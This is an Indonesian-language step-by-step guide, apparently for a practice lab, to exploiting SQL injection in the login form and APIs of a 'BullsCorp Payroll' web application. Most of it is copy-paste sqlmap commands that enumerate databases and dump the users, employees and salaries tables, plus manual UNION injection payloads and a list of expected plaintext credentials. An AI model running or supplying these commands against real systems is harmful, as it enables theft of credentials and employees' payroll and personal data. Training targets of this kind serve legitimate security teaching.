# SQLMap Guide untuk BullsCorp Payroll

## Masalah yang Anda Alami

Berdasarkan hasil testing, **tabel users DAPAT diinjeksi** dan SQLMap seharusnya bisa mendeteksinya. Jika SQLMap tidak menampilkan tabel users, kemungkinan ada masalah dengan:

1. **Parameter yang salah** - Pastikan menggunakan parameter `username` bukan yang lain
2. **Endpoint yang salah** - Gunakan `/public/login.php` bukan endpoint lain
3. **Method yang salah** - Harus menggunakan POST method
4. **Database detection** - SQLMap mungkin tidak mendeteksi database dengan benar

## Vulnerable Endpoints yang Terkonfirmasi

### 1. Login Form (PALING MUDAH)
```bash
# Basic detection
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username --batch

# List databases
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username --dbs --batch

# List tables in bullscorp_payroll
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll --tables --batch

# Dump users table
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users --dump --batch
```

### 2. API User Data (GET Parameter)
```bash
# Perlu session cookie valid terlebih dahulu
sqlmap -u "http://localhost/api/user_data.php?user_id=1" --cookie "PHPSESSID=your_session_id" -p user_id --batch
```

### 3. Search API (GET Parameter)
```bash
# Perlu session cookie valid
sqlmap -u "http://localhost/api/search.php?q=test" --cookie "PHPSESSID=your_session_id" -p q --batch
```

## Menggunakan Request File

Buat file `request.txt`:
```
POST /public/login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=admin&password=test123
```

Kemudian jalankan:
```bash
sqlmap -r request.txt -p username --batch --dbs
sqlmap -r request.txt -p username -D bullscorp_payroll --tables --batch
sqlmap -r request.txt -p username -D bullscorp_payroll -T users --dump --batch
```

## Troubleshooting SQLMap

### Jika SQLMap Tidak Mendeteksi Vulnerability:

1. **Gunakan level dan risk yang lebih tinggi:**
```bash
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --level=5 --risk=3 --batch
```

2. **Force detection dengan technique tertentu:**
```bash
# Union-based
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --technique=U --batch

# Boolean-based blind
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --technique=B --batch

# Time-based blind
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --technique=T --batch
```

3. **Gunakan custom payload:**
```bash
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --suffix=" -- " --batch
```

### Jika Tabel Users Tidak Muncul:

1. **Cek semua database:**
```bash
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --dbs --batch
```

2. **Cek dengan database yang benar:**
```bash
# Pastikan menggunakan database bullscorp_payroll
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll --tables --batch
```

3. **Dump semua tabel:**
```bash
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll --dump-all --batch
```

## Manual Testing (Jika SQLMap Gagal)

Anda bisa test manual dengan payload ini di form login:

### Username Field Payloads:
```sql
-- Basic Union Injection
admin' UNION SELECT 1,2,3,4,5,6,7,8 -- 

-- Extract Users Data
admin' UNION SELECT id,username,password,email,role,employee_id,created_at,last_login FROM users -- 

-- Get Database Info
admin' UNION SELECT 1,database(),version(),user(),5,6,7,8 -- 

-- List All Tables
admin' UNION SELECT 1,table_name,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='bullscorp_payroll' -- 
```

## Hasil yang Diharapkan

Jika berhasil, Anda akan mendapatkan:

### Database List:
- information_schema
- bullscorp_payroll
- mysql
- performance_schema
- sys

### Tables dalam bullscorp_payroll:
- attendance
- employees  
- salaries
- submissions
- system_logs
- **users** ← Ini yang Anda cari!

### Data dari tabel users:
- 57 users total
- Admin: admin/admin5231
- HR: hr/hr2145  
- Employees: [nama]/halahgampang
- Password hashes (bcrypt)
- Email addresses
- Roles (admin/hr/employee)

## Command Lengkap untuk Copy-Paste

```bash
# Step 1: Deteksi vulnerability
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --batch

# Step 2: List databases  
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username --dbs --batch

# Step 3: List tables
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll --tables --batch

# Step 4: Dump users table
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users --dump --batch

# Step 5: Dump all sensitive tables
sqlmap -u "http://localhost/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users,employees,salaries --dump --batch
```

## Catatan Penting

1. **Pastikan web server berjalan** di localhost
2. **Database harus sudah diinisialisasi** dengan menjalankan `php config/init_mysql.php`
3. **Gunakan --batch** untuk auto-answer semua prompt
4. **Vulnerability sudah terkonfirmasi** - jika SQLMap gagal, coba manual testing
5. **Tabel users pasti ada** dengan 57 records

Jika masih bermasalah, coba jalankan `php test_sql_injection.php` untuk memverifikasi bahwa vulnerability masih ada dan database terkoneksi dengan benar.

# 1. Dump kolom penting (username, password, email, role)
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users -C "id,username,password,email,role" --dump --batch

# 2. Atau dump semua kolom dengan technique UNION
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users --dump --technique=U --batch --threads=1

# 3. Atau dengan level tinggi untuk force detection
sqlmap -u "http://192.192.2.80:3000/public/login.php" --data "username=admin&password=test" -p username -D bullscorp_payroll -T users --dump --level=5 --risk=3 --batch
